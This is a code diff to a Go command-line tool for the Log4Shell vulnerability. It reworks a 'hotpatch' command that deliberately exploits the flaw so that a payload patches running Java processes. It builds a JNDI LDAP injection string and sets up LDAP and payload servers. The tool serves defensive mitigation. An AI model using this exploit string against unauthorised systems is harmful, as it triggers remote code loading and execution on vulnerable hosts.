@@ -16,6 +16,7 @@ package main
 
 import (
 	"encoding/json"
+	"fmt"
 	"github.com/lunasec-io/lunasec/tools/log4shell/constants"
 	"github.com/lunasec-io/lunasec/tools/log4shell/patch"
 	"github.com/lunasec-io/lunasec/tools/log4shell/scan"
@@ -81,15 +82,38 @@ func scanCommand(c *cli.Context) error {
 func hotpatchCommand(c *cli.Context) error {
 	enableGlobalFlags(c)
 
-	ip := c.String("ip")
+	payloadUrl := c.String("payload-url")
+	ldapHost := c.String("ldap-host")
+	ldapPort := c.Int("ldap-port")
 
-	if ip == "" {
-		log.Info().Msg("Public IP not provided. Binding to the local network interface.")
-		ip = "localhost"
+	if payloadUrl == "" {
+		log.Info().
+			Str("defaultPayloadUrl", constants.DefaultPayloadUrl).
+			Msg("Payload URL not provided. Using the default payload url.")
+		payloadUrl = constants.DefaultPayloadUrl
 	}
 
-	hotpatchServer := patch.NewHotpatchLDAPServer(ip)
-	hotpatchPayloadServer := patch.NewHotpatchPayloadServer(hotpatchFiles)
+	if ldapPort == 0 {
+		ldapPort = constants.DefaultLDAPServerPort
+	}
+
+	payloadServerHost, payloadServerPort, err := util.ParseHostAndPortFromUrlString(payloadUrl)
+	if err != nil {
+		log.Error().
+			Err(err).
+			Str("payloadUrl", payloadUrl).
+			Msg("Unable to parse provided payload server URL.")
+		return err
+	}
+
+	if ldapHost == "" {
+		ldapHost = payloadServerHost
+	}
+
+	payload := fmt.Sprintf("${jndi:ldap://%s:%d/a}", ldapHost, ldapPort)
+
+	hotpatchServer := patch.NewHotpatchLDAPServer(ldapPort, payloadUrl)
+	hotpatchPayloadServer := patch.NewHotpatchPayloadServer(payloadServerPort, hotpatchFiles, payload)
 
 	log.Info().
 		Msg("Starting Log4Shell hotpatch LDAP and payload servers")
@@ -169,8 +193,16 @@ func main() {
 				Usage:   "Perform a live hotpatch of a system by exploiting the log4shell vulnerability for immediate mitigation. The payload executed patches the running process to prevent further payloads from being able to be executed.",
 				Flags: []cli.Flag{
 					&cli.StringFlag{
-						Name:  "ip",
-						Usage: "If testing locally, set this to a local network interface (view available interfaces with ifconfig/ipconfig). If using on a remote server, set this value to the publicly accessible IP address of the server.",
+						Name:  "payload-url",
+						Usage: "The url for the payload server. This must be an accessible route from any targeted host. (ex. https://hotpatch.lunasec.com)",
+					},
+					&cli.StringFlag{
+						Name:  "ldap-host",
+						Usage: "The hostname for the Log4Shell LDAP server.",
+					},
+					&cli.IntFlag{
+						Name:  "ldap-port",
+						Usage: "The port for the Log4Shell LDAP server.",
 					},
 				},
 				Action: hotpatchCommand,
